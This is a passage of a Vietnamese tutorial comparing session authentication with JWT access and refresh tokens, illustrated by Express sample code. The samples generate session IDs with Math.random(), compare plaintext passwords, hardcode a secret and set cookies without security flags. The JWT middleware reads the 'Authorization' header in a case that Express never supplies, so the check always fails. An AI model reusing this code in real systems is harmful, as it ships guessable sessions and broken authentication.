function isAuthenticated(req, res, next) {
  const sessionId = req.cookies.session_id // Lấy Session ID từ cookie
  if (sessionId && sessions[sessionId]) {
    // Nếu có sessionId và nó tồn tại trong session
    req.session = sessions[sessionId] // Lấy thông tin session
    next() // Tiếp tục xử lý request
  } else {
    res.status(401).json({ message: 'Unauthorized' }) // Trả về lỗi 401 nếu chưa xác thực
  }
}

// Điểm cuối để xử lý đăng nhập
app.post('/login', (req, res) => {
  const username = req.body.username
  const password = req.body.password

  const user = users[username]

  if (user && password === user) {
    // Kiểm tra tên người dùng và mật khẩu
    const newSessionId = Math.random().toString(36).substring(2) // Tạo ID session mới
    req.session = { id: newSessionId, user: user } // Lưu thông tin session
    sessions[newSessionId] = req.session

    res.cookie('session_id', newSessionId) // Lưu Session ID vào cookie
    res.json({ message: 'Logged in' }) // Trả về thông báo thành công
  } else {
    res.status(401).json({ message: 'Invalid username or password' }) // Trả về lỗi nếu sai tên người dùng hoặc mật khẩu
  }
})

// Điểm cuối bảo vệ, yêu cầu xác thực người dùng
app.get('/protected', isAuthenticated, (req, res) => {
  res.json({ message: 'Protected content' }) // Trả về nội dung được bảo vệ
})

// Khởi động server ứng dụng
app.listen(3000, () => {
  console.log('Server is running on port 3000')
})
```

<br>

### <font color="#cd7f32">🥉 Ưu điểm - Nhược điểm </font>

- <font color="#15cf24">Pros</font>

  - Dễ triển khai, hầu như mấy `framework web` hiện nay đều giúp bạn thực hiện `session authentication` một cách cực kỳ dễ dàng chỉ với vài dòng code

  - Bảo mật thông tin người dùng. Như bạn thấy đấy, người dùng chỉ lưu một cái chuỗi ngẫu nhiên (`session id`) trên máy mình và gửi nó lên `server` qua mỗi `request`, nên mấy cái thông khác như username, password, ... không bị lộ ra ngoài

  - Toàn quyền kiểm soát phiên làm việc của người dùng. Vì mọi thứ bạn lưu trữ ở `server` nên bạn có thể đăng xuất người dùng bất cứ khi nào bạn muốn bằng việc xóa `session id` của họ trong bộ nhớ lưu trữ phía `server`.

- <font color="#15cf24">Cons</font>

  - Việc toàn quyền kiểm soát vừa là ưu điểm cũng vừa là nhược điểm của `session authentication`. Vì bạn phải lưu trữ thông tin phiên làm việc của người dùng nên bạn phải có một bộ nhớ lưu trữ phía `server`. Ví dụ bạn lưu trữ trên `RAM` thì không thể chia sẻ cho các `server` khác được (dính `DDOS` hay restart `server` lại mất hết), lưu trữ trên `database` thì lại tốn kém thêm chi phí, bộ nhớ,...

  - Bộ nhớ lưu trữ `session` sẽ phình to rất nhanh vì mỗi khi có một người dùng đăng nhập thì bạn lại phải lưu trữ một `session id` mới, cái này phình to nhanh lắm đấy 😂

  - Tốc độ chậm, vì mỗi request đến `server`, `server` điều phải kiểm tra trong bộ nhớ lưu trữ xem `session id` có hợp lệ hay không. Nếu bạn lưu trữ trên `database` thì tốc độ sẽ chậm hơn nữa.

  - Khó khăn trong việc scale ngang `server`. Ví dụ khi `server` lớn lên, bạn phải có nhiều `server` để chịu tải hơn, thì việc chia sẻ `session id` giữa các `server` là một vấn đề khó khăn, kiểu gì bạn cũng phải tìm cái gì đó chung giữa các `server` như `database` chung chẳn hạn. Lại `database`, nếu nó lớn lên lại tìm cách scale `database` 🥲

<br>

🆗<font color="#1caafc">Special</font>🆗

<font color="#1caafc"> =========================================================== </font>

- _<font color="#15cf24">Scale ngang</font> là chúng ta mở rộng quy mô hệ thống bằng cách thêm các `server` mới vào hệ thống, thay vì nâng cấp `server` hiện tại lên một cấu hình cao hơn._

- _<font color="#15cf24">Scale dọc</font> là chúng ta mở rộng quy mô hệ thống bằng cách nâng cấp `server` hiện tại lên một cấu hình cao hơn._

<font color="#1caafc"> =========================================================== </font>

<br>

# <font color="#fca61c">🥇 JWT Authentication</font>

**<font color="#15cf24">JSON Web Token (JWT)</font>** là một chuẩn mở (RFC 7519) giúp truyền tải thông tin dưới dạng `JSON`.

**<font color="#15cf24">Token</font>** là một chuỗi ký tự được tạo ra để đại diện cho một đối tượng hoặc một quyền truy cập nào đó, ví dụ như `access token`, `refresh token`, `jwt`... Token thường được sử dụng trong các hệ thống xác thực và ủy quyền để kiểm soát quyền truy cập của người dùng đối với tài nguyên hoặc dịch vụ.

<br>

⚠️<font color="#fca61c">Attention</font>⚠️

<font color="#fca61c"> =========================================================== </font>

- _Ở đây có một lưu ý là: Tất cả các `JWT` đều là `token`, nhưng không phải tất cả các `token` đều là `JWT`._

- _Bởi vì kích thước tương đối nhỏ, `JWT` có thể được gửi qua `URL`, qua tham số `POST`, hoặc bên trong `HTTP Header` mà không ảnh hưởng nhiều đến tốc độ `request`._

<font color="#fca61c"> =========================================================== </font>

<br>

## <font color="#C0C0C0">🥈 Cấu Trúc JWT</font>

- Ví dụ:

  ```plaintext
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjQ0MTE4NDdhZmJkYjUxMmE1MmMwNTQ4IiwidHlwZSI6MCwiaWF0IjoxNjgyMDgyNTA0LCJleHAiOjE2OTA3MjI1MDR9.QjSI3gJZgDSEHz6eYkGKIQ6gYiiizg5C0NDbGbGxtWU
  ```

- Cái chuỗi `JWT` trên có cấu trúc gồm ba phần, mỗi phần được phân tách bởi dấu chấm (.): `Header`, `Payload` và `Signature`.

  - <font color="#15cf24">_Header_</font>: Phần này chứa thông tin về loại `token` (thường là "`JWT`") và thuật toán mã hóa được sử dụng để tạo chữ ký (ví dụ: `HMAC` `SHA256` hoặc `RSA`). `Header` sau đó được mã hóa dưới dạng chuỗi `Base64Url`. (Thử `decode` `Base64` cái chuỗi `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` này ra thì nó sẽ có dạng `'{"alg":"HS256","typ":"JWT"}'`)

  - <font color="#15cf24">_Payload_</font>: Phần này chứa các thông tin mà người dùng định nghĩa. `Payload` cũng được mã hóa dưới dạng chuỗi `Base64Url`.

  - <font color="#15cf24">_Signature_</font>: Phần này được tạo bằng cách dùng thuật toán `HMACSHA256` (cái này có thể thay đổi) với nội dung là `Base64 encoded Header` + `Base64 encoded Payload` kết hợp một `"secret key"` (khóa bí mật). `Signature` (Chữ ký) giúp đảm bảo tính toàn vẹn và bảo mật của thông tin trong `JWT` (Công thức chi tiết nhìn xuống phía dưới nhé)

- Giải mã cụ thể như sau:

  - <font color="#15cf24">_HEADER:ALGORITHM & TOKEN TYPE_</font>

    ```json
    {
      "alg": "HS256",
      "typ": "JWT"
    }
    ```

  - <font color="#15cf24">_PAYLOAD:DATA_</font>

    ```json
    {
      "user_id": "64411847afbdb512a52c0548",
      "type": 0,
      "iat": 1682082504,
      "exp": 1690722504
    }
    ```

  - <font color="#15cf24">_VERIFY SIGNATURE_</font>

    ```js
    HMACSHA256(base64UrlEncode(header) + '.' + base64UrlEncode(payload), secret)
    ```

<br>

⚠️<font color="#fca61c">Attention</font>⚠️

<font color="#fca61c"> =========================================================== </font>

- _Tất cả mọi người đều biết được thông tin `Header` và `Payload` của cái `JWT`_

- _Nhưng có một điều quan trọng là chỉ có `server` mới biết được `secret_key` để tạo ra `Signature`. Vì vậy chỉ có `server` mới có thể `verify` được cái `JWT` này là do chính `server` tạo ra._

- _Bạn không tin ư? Tôi đố bạn tạo ra được `JWT` như trên đó, dù bạn biết `Header` và `Payload` nhưng để tạo ra cái `Signature` thì bạn cần phải biết được `secret_key` của mình (nhìn c)._

- _Mặc định thì `JWT` dùng thuật toán `HMACSHA256` nên chúng ta yên tâm rằng `JWT` có độ an toàn cực cao và rất khó bị làm giả._

<font color="#fca61c"> =========================================================== </font>

<br>

## <font color="#C0C0C0">🥈 Authentication with Access Token</font>

<br>

🆗<font color="#1caafc">Special</font>🆗

<font color="#1caafc"> =========================================================== </font>

- _Phương pháp dùng `token` để xác thực như thế này người ta gọi là `Token Based Authentication`_

- _Với `JWT` thì người ta phát hiện ra rằng chỉ cần tạo 1 cái `token JWT`, lưu thông tin người dùng vào như user_id hay role... rồi gửi cho người dùng, `server` không cần phải lưu trữ cái `token JWT` này làm gì. Mỗi lần người dùng `request` lên `server` thì gửi cái `token JWT` này lên, `Server` chỉ cần `verify` cái `token JWT` này là biết được người dùng này là ai, có quyền truy cập tài nguyên hay không._

- _Không có ai có thể tạo ra được cái `token JWT` của bạn trừ khi họ biết cái `secret_key` của bạn, mà cái `secret_key` này bạn lưu trữ trên `server` mà, sao mà biết được (trừ bạn bị hack hay lỡ tay làm lộ thì chịu)._

- _Vậy là chúng ta không cần lưu trữ cái `JWT` này trên `server` nữa, chỉ cần `client` lưu trữ là đủ rồi._

- _Tiết kiệm biết bao nhiêu là bộ nhớ cho `server`, mà còn nhanh nữa chứ (vì bỏ qua bước kiểm tra trong cơ sở dữ liệu, cái bước `verify` `jwt` thì nó nhanh lắm)_

<font color="#1caafc"> =========================================================== </font>

<br>

### <font color="#cd7f32">🥉 Access Token</font>

- **<font color="#15cf24">Access Token</font>** để xác thực người dùng có quyền truy cập vào tài nguyên hay không.

- **<font color="#15cf24">Access Token</font>** là một chuỗi với bất kỳ định dạng nào, nhưng định dạng phổ biến nhất của `access token` là `JWT`. Thường thì cấu trúc data trong `access token` sẽ theo chuẩn này (https://datatracker.ietf.org/doc/html/rfc9068). Tuy nhiên bạn có thể thay đổi theo ý thích, miễn sao phù hợp với dự án là được.

- Ví dụ:

  ```plaintext
  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjQ0MTE4NDdhZmJkYjUxMmE1MmMwNTQ4IiwiaWF0IjoxNjgyMDgyNTA0LCJleHAiOjE2OTA3MjI1MDR9.tWlX7E7NPNftg37fXrdsXvkgEWB_8zaHIQmryAXzElY
  ```

  - `payload` của `access token`:

    ```json
    {
      "user_id": "64411847afbdb512a52c0548",
      "iat": 1682082504,
      "exp": 1690722504
    }
    ```

  - Trong này có 3 trường quan trọng mà `server` dùng để kiểm tra `token` liệu có đúng người, hay còn hiệu lực không
    - <font color="#15cf24">_user_id_</font>: Chính là id định danh của người dùng, để biết `token` này là của người nào
    - <font color="#15cf24">_iat_</font>: Thời gian bắt đầu `token` này có hiệu lực
    - <font color="#15cf24">_exp_</font>: Thời gian kết thúc `token` này

<br>

### <font color="#cd7f32">🥉Flow Access Token</font>

![Alt text](image-3.png)

- <font color="#15cf24">_Bước 1_</font>: `Client` gửi `request` vào tài nguyên được bảo vệ trên `server`. Nếu `client` chưa được xác thực, `server` trả về lỗi `401 Authorization`. `Client` gửi username và password của họ cho `server`.

- <font color="#15cf24">_Bước 2_</font>: `Server` xác minh thông tin xác thực được cung cấp so với cơ sở dữ liệu user. Nếu thông tin xác thực khớp, `server` tạo ra một `JWT` chứa `payload` là user_id (hoặc trường nào đó định danh người dùng). `JWT` này được gọi là `Access Token`.

- <font color="#15cf24">_Bước 3_</font>: `Server` gửi `access token` cho `client`.

- <font color="#15cf24">_Bước 4_</font>: `Client` lưu trữ `access token` ở bộ nhớ thiết bị (`cookie`, `local` `storage`,...).

- <font color="#15cf24">_Bước 5_</font>: Đối với các yêu cầu tiếp theo, `client` gửi kèm `access token` trong `header` của `request`.

- <font color="#15cf24">_Bước 6_</font>: `Server` `verify` `access token` bằng `secret key` để kiểm tra `access token` có hợp lệ không.

- <font color="#15cf24">_Bước 7_</font>: Nếu hợp lệ, `server` cấp quyền truy cập vào tài nguyên được yêu cầu. Khi người dùng muốn đăng xuất thì chỉ cần xóa `access token` ở bộ nhớ thiết bị là được.

- <font color="#15cf24">_Bước 8_</font>: Khi `access token` hết hạn thì `server` sẽ từ chối yêu cầu của `client`, `client` lúc này sẽ xóa `access token` ở bộ nhớ thiết bị và chuyển sang trạng thái bị logout.

<br>

🥑 **<font color="#15cf24">SAMPLE CODE</font>**

```js
// Tải các gói cần thiết
const express = require('express')
const jwt = require('jsonwebtoken')

// Tạo ứng dụng Express
const app = express()

// Sử dụng middleware express.json() để phân tích cú pháp các yêu cầu dạng JSON
app.use(express.json())

// Định nghĩa một secret key để mã hóa và giải mã token
const accessTokenSecret = 'yourAccessTokenSecret'

// Danh sách người dùng mẫu (thay thế bằng cơ sở dữ liệu thực tế)
const users = [
  {
    username: 'user1',
    password: 'password1'
  },
  {
    username: 'user2',
    password: 'password2'
  }
]

// Định nghĩa một middleware để xác thực access token
const authenticateToken = (req, res, next) => {
  // Lấy access token từ header
  const authHeader = req.headers['Authorization']
  const token = authHeader && authHeader.split(' ')[1]

  // Nếu không có token, trả về lỗi 401 (Unauthorized)
  if (token == null) {
    return res.sendStatus(401)
  }

  // Nếu có token, giải mã token và xác thực
  jwt.verify(token, accessTokenSecret, (err, user) => {
    // Nếu xảy ra lỗi hoặc token không hợp lệ, trả về lỗi 403 (Forbidden)
    if (err) {
      return res.sendStatus(403)
    }

    // Nếu token hợp lệ, tiếp tục xử lý yêu cầu
    req.user = user
    next()
  })
}

// Định nghĩa route đăng nhập để tạo và cấp access token
app.post('/login', (req, res) => {
  // Đọc thông tin đăng nhập từ yêu cầu
  const { username, password } = req.body

  // Tìm kiếm người dùng trong danh sách mẫu
  const user = users.find((u) => u.username === username && u.password === password)

  // Nếu không tìm thấy người dùng, trả về lỗi 401 (Unauthorized)
  if (!user) {
    return res.sendStatus(401)
  }

  // Nếu tìm thấy người dùng, tạo access token và trả về cho người dùng
  const accessToken = jwt.sign({ username: user.username }, accessTokenSecret, { expiresIn: '1h' })
  res.json({ accessToken })
})

// Tạo một route đơn giản để kiểm tra access token
app.get('/protected', authenticateToken, (req, res) => {
  res.json({ message: 'Bạn đã truy cập thành công nội dung được bảo vệ' })
})

// Khởi động máy chủ
app.listen(3000, () => {
  console.log('Máy chủ đang chạy trên cổng 3000')
})
```

<br>

🆘<font color="#fc1c50">Danger</font>🆘

<font color="#fc1c50"> =========================================================== </font>

_<font color="#fc1c50">Vấn đề của Access Token</font>_

- Như flow trên thì chúng ta không lưu `access token` ở trên `server`, mà lưu ở trên `client`. Điều này gọi là `stateless`, tức là `server` không lưu trữ trạng thái nào của người dùng nào cả.

- Khuyết điểm của nó là chúng ta không thể thu hồi `access token` được. Các bạn có thể xem một số ví dụ dưới đây.

- Ví dụ 1: Ở `server`, chúng ta muốn chủ động đăng xuất một người dùng thì không được, vì không có cách nào xóa `access token` ở thiết bị `client` được.

- Ví dụ 2: `Client` bị hack dẫn đến làm lộ `access token`, hacker lấy được `access token` và có thể truy cập vào tài nguyên được bảo vệ. Dù cho `server` biết điều đấy nhưng không thể từ chối `access token` bị hack đó được, vì chúng ta chỉ `verify` `access token` có đúng hay không chứ không có cơ chế kiểm tra `access token` có nằm trong danh sách blacklist hay không.

- Với ví dụ thứ 2, chúng ta có thể thiết lập thời gian hiệu lực của `access token` ngắn, ví dụ là 5 phút, thì nếu `access token` bị lộ thì hacker cũng có ít thời gian để xâm nhập vào tài nguyên của chúng ta hơn => giảm thiểu rủi ro.

- Nhưng mà cách này không hay lắm, vì nó sẽ làm cho người dùng bị logout và phải login sau mỗi 5 phút, rất khó chịu về trải nghiệm người dùng.

- Lúc này người ta mới nghĩ ra ra một cách để giảm thiểu những vấn đề trên, đó là sử dụng thêm `Refresh Token`.

<font color="#fc1c50"> =========================================================== </font>

<br>

### <font color="#cd7f32">🥉Refresh Token</font>

- **<font color="#15cf24">Refresh Token</font>** là một chuỗi token khác, được tạo ra cùng lúc với `Access Token`. `Refresh Token` có thời gian hiệu lực lâu hơn `Access Token`, ví dụ như 1 tuần, 1 tháng, 1 năm...

<br>

### <font color="#cd7f32">🥉Flow Refresh Token</font>

- <font color="#15cf24">_Bước 1_</font>: `Client` gửi `request` vào tài nguyên được bảo vệ trên `server`. Nếu `client` chưa được xác thực, `server` trả về lỗi `401 Authorization`. `Client` gửi username và password của họ cho `server`.

- <font color="#15cf24">_Bước 2_</font>: `Server` xác minh thông tin xác thực được cung cấp so với cơ sở dữ liệu user. Nếu thông tin xác thực khớp, `server` tạo ra 2 `JWT` khác nhau là `Access Token` và `Refresh Token` chứa `payload` là user_id (hoặc trường nào đó định danh người dùng). `Access Token` có thời gian ngắn (cỡ 5 phút). `Refresh Token` có thời gian dài hơn (cỡ 1 năm). `Refresh Token` sẽ được lưu vào cơ sở dữ liệu, còn `Access Token` thì không.

- <font color="#15cf24">_Bước 3_</font>: `Server` trả về `access token` và `refresh token` cho `client`.

- <font color="#15cf24">_Bước 4_</font>: `Client` lưu trữ `access token` và `refresh token` ở bộ nhớ thiết bị (`cookie`, `local storage`,...).

- <font color="#15cf24">_Bước 5_</font>: Đối với các yêu cầu tiếp theo, `client` gửi kèm `access token` trong `header` của `request`.

- <font color="#15cf24">_Bước 6_</font>: `Server` `verify` `access token` bằng `secret key` để kiểm tra `access token` có hợp lệ không.

- <font color="#15cf24">_Bước 7_</font>: Nếu hợp lệ, `server` cấp quyền truy cập vào tài nguyên được yêu cầu.

- <font color="#15cf24">_Bước 8_</font>: Khi `access token` hết hạn, `client` gửi `refresh token` lên `server` để lấy `access token` mới.

- <font color="#15cf24">_Bước 9_</font>: `Server` kiểm tra `refresh token` có hợp lệ không, có tồn tại trong cơ sở dữ liệu hay không. Nếu ok, `server` sẽ xóa `refresh token` cũ và tạo ra `refresh token` mới với expire date như cũ (ví dụ cái cũ hết hạn vào 5/10/2023 thì cái mới cũng hết hạn vào 5/10/2023) lưu vào cơ sở dữ liệu, tạo thêm `access token` mới.

- <font color="#15cf24">_Bước 10_</font>: `Server` trả về `access token` mới và `refresh token` mới cho `client`.

- <font color="#15cf24">_Bước 11_</font>: `Client` lưu trữ `access token` và `refresh token` mới ở bộ nhớ thiết bị (`cookie`, `local storage`,...).

- <font color="#15cf24">_Bước 12_</font>: `Client` có thể thực hiện các yêu cầu tiếp theo với `access token` mới (quá trình `refresh token` diễn ra ngầm nên `client` sẽ không bị logout).

- <font color="#15cf24">_Bước 13_</font>: Khi người dùng muốn đăng xuất thì gọi API logout, `server` sẽ xóa `refresh token` trong cơ sở dữ liệu, đồng thời `client` phải thực hiện xóa `access token` và `refresh token` ở bộ nhớ thiết bị.

- <font color="#15cf24">_Bước 14_</font>: Khi `refresh token` hết hạn (hoặc không hợp lệ) thì `server` sẽ từ chối yêu cầu của `client`, `client` lúc này sẽ xóa `access token` và `refresh token` ở bộ nhớ thiết bị và chuyển sang trạng thái bị logout.

<br>

🆘<font color="#fc1c50">Danger</font>🆘

<font color="#fc1c50"> =========================================================== </font>

<font color="#fc1c50">_Vấn đề bất cập giữa lý thuyết và thực tế_</font>

- Mong muốn của việc xác thực bằng `JWT` là `stateless`, nhưng ở trên các bạn để ý mình lưu `refresh token` vào cơ sở dữ liệu, điều này làm cho `server` phải lưu trữ trạng thái của người dùng, tức là không còn `stateless` nữa.

- Chúng ta muốn bảo mật hơn thì chúng ta không thể cứng nhắc cứ `stateless` được, vậy nên kết hợp `stateless` và `stateful` lại với nhau có vẻ hợp lý hơn. `Access Token` thì `stateless`, còn `Refresh Token` thì `stateful`.

- Đây là lý do mình nói có sự mâu thuẫn giữa lý thuyết và thực tế áp dụng, khó mà áp dụng hoàn toàn `stateless` cho `JWT` trong thực tế được.

- Và có một lý do nữa tại sao mình lưu `refresh token` trong `database` đó là `refresh token` thì có thời gian tồn tại rất là lâu, nếu biết ai bị lô `refresh token` thì mình có thể xóa những cái `refresh token` của user đó trong `database`, điều này sẽ làm cho hệ thống an toàn hơn.

- Tương tự nếu mình muốn logout một người dùng nào đó thì mình cũng có thể xóa `refresh token` của người đó trong `database`. Sau khoản thời gian `access token` họ hết hạn thì họ thực hiện `refresh token` sẽ không thành công và họ sẽ bị logout. Có điều là nó không tức thời, mà phải đợi đến khi `access token` hết hạn thì mới logout được.

- Chúng ta cũng có thể cải thiện thêm bằng cách cho thời gian hết hạn `access token` ngắn lại và dùng `websocket` để thông báo cho `client` logout ngay lập tức.

<font color="#fc1c50"> =========================================================== </font>

<br>

🆗<font color="#1caafc">Special</font>🆗

<font color="#1caafc"> =========================================================== </font>

- <font color="#1caafc">_Tại sao lại tạo một refresh token mới khi chúng ta thực hiện refresh token?_</font>

  - Vì nếu `refresh token` bị lộ, hacker có thể sử dụng nó để lấy `access token` mới, điều này khá nguy hiểm. Vậy nên dù `refresh token` có thời gian tồn tại rất lâu, nhưng cứ sau vài phút khi `access token` hết hạn và thực hiện `refresh token` thì mình lại tạo một `refresh token` mới và xóa `refresh token` cũ.

  - Lưu ý là cái `Refresh Token` mới vẫn giữ nguyên ngày giờ hết hạn của `Refresh Token` cũ. Cái cũ hết hạn vào 5/10/2023 thì cái mới cũng hết hạn vào 5/10/2023.

  - Cái này gọi là `refresh token rotation`.

- <font color="#1caafc">_Làm thế nào để `revoke` (thu hồi) một `access token`?_</font>

  - Các bạn có thể hiểu `revoke` ở đây nghĩa là thu hồi hoặc vô hiệu hóa

  - Như mình đã nói ở trên thì `access token` chúng ta thiết kế nó là `stateless`, nên không có cách nào `revoke` ngay lập tức đúng nghĩa được mà chúng ta phải chữa cháy thông qua `websocket` và `revoke` `refresh token`

  - Còn nếu bạn muốn `revoke` ngay thì bạn phải lưu `access token` vào trong `database`, khi muốn `revoke` thì xóa nó trong `database` là được, nhưng điều này sẽ làm `access token` không còn `stateless` nữa.

- <font color="#1caafc">_Có khi nào có 2 JWT trùng nhau hay không?_</font>

  - Có! Nếu `payload` và `secret key` giống nhau thì 2 `JWT` sẽ giống nhau.

  - Các bạn để ý thì trong `payload` `JWT` sẽ có trường `iat` (issued at) là thời gian tạo ra `JWT` (đây là trường mặc định, trừ khi bạn `disable` nó). Và trường `iat` nó được tính bằng giây.

  - Vậy nên nếu chúng ta tạo ra 2 `JWT` trong cùng 1 giây thì lúc thì trường `iat` của 2 `JWT` này sẽ giống nhau, cộng với việc `payload` các bạn truyền vào giống nhau nữa thì sẽ cho ra 2 `JWT` giống nhau.

- <font color="#1caafc">_Ở client thì nên lưu access token và refresh token ở đâu?_</font>

  - Nếu trình duyệt thì các bạn lưu ở `cookie` hay `local storage` đều được, mỗi cái đều có ưu nhược điểm riêng. Nhưng `cookie` sẽ có phần chiếm ưu thế hơn "1 tí xíu" về độ bảo mật.

  - Chi tiết so sánh giữa `local storage` và `cookie` thì mình sẽ có một bài viết sau nhé.

  - Còn nếu là mobile app thì các bạn lưu ở bộ nhớ của thiết bị.

- <font color="#1caafc">_Gửi access token lên server như thế nào?_</font>

  - Lưu `cookie`: Nó sẽ tự động gửi mỗi khi `request` đến `server`, không cần quan tâm nó.

  - Lưu `local storage`: Các bạn thêm vào `header` với `key` là `Authorization` và giá trị là `Bearer <access_token>`.

- <font color="#1caafc">_Tại sao phải thêm Bearer vào trước `access token`?_</font>

  - Thực ra bạn thêm hay không thêm thì phụ thuộc vào cách `server` backend họ code như thế nào.

  - Để mà code api `authentication` chuẩn, thì `server` nên yêu cầu `client` phải thêm `Bearer` vào trước `access token`. Mục đích để nói xác thực là `"Bearer Authentication"` (xác thực dựa trên token).

  - `Bearer Authentication` được đặt tên dựa trên từ `"bearer"` có nghĩa là "người mang" - tức là bất kỳ ai có token này sẽ được coi là người có quyền truy cập vào tài nguyên được yêu cầu. Điều này khác với các phương pháp xác thực khác như `"Basic Authentication"` (xác thực cơ bản) hay `"Digest Authentication"` (xác thực băm), cần sử dụng thông tin đăng nhập người dùng.

  - Việc thêm `"Bearer"` vào trước `access token` có một số mục đích chính:

    - Xác định loại xác thực: Cung cấp thông tin cho máy chủ về phương thức xác thực mà ứng dụng khách muốn sử dụng. Điều này giúp máy chủ xử lý yêu cầu một cách chính xác hơn.

    - Tính chuẩn mực: Sử dụng tiền tố `"Bearer"` giúp đảm bảo rằng các ứng dụng và máy chủ tuân theo các quy tắc chuẩn trong cách sử dụng và xử lý `token`.

    - Dễ phân biệt: Thêm `"Bearer"` giúp phân biệt giữa các loại `token` và xác thực khác nhau. Ví dụ, nếu máy chủ hỗ trợ nhiều phương thức xác thực, từ `"Bearer"` sẽ giúp máy chủ xác định loại xác thực đang được sử dụng dựa trên `token`.

  - Khi sử dụng `Bearer Authentication`, tiêu đề `Authorization` trong yêu cầu `HTTP` sẽ trông như sau:

    ```bash
    Authorization: Bearer your_access_token
    ```

- <font color="#1caafc">_Khi tôi logout, tôi chỉ cần xóa access token và refresh token ở bộ nhớ của client là được chứ?_</font>

  - Nếu bạn không gọi api logout mà đơn thuần chỉ xóa `access token` và `refresh token` ở bộ nhớ của `client` thì bạn vẫn sẽ logout được, nhưng sẽ không tốt cho hệ thống về mặt bảo mật. Vì `refresh token` vẫn còn tồn tại ở `database`, nếu hacker có thể lấy được `refresh token` của bạn thì họ vẫn có thể lấy được `access token` mới.

- <font color="#1caafc">_Tôi có nghe về OAuth 2.0, vậy nó là gì?_</font>

  - `OAuth 2.0` là một giao thức xác thực và ủy quyền tiêu chuẩn dành cho ứng dụng web, di động và máy tính để bàn. Nó cho phép ứng dụng của bên thứ ba (còn gọi là ứng dụng khách) truy cập dữ liệu và tài nguyên của người dùng từ một dịch vụ nhà cung cấp (như Google, Facebook, Twitter, ...) mà không cần biết thông tin đăng nhập của người dùng.

  - Nói đơn giản, nó chỉ là một giao thức thôi, ứng dụng là làm mấy chức năng như đăng nhập bằng google, facebook trên chính website chúng ta á 😂.

  - Về cái này mình sẽ có một bài viết riêng luôn, vẫn trong series này nhé.

<font color="#1caafc"> =========================================================== </font>
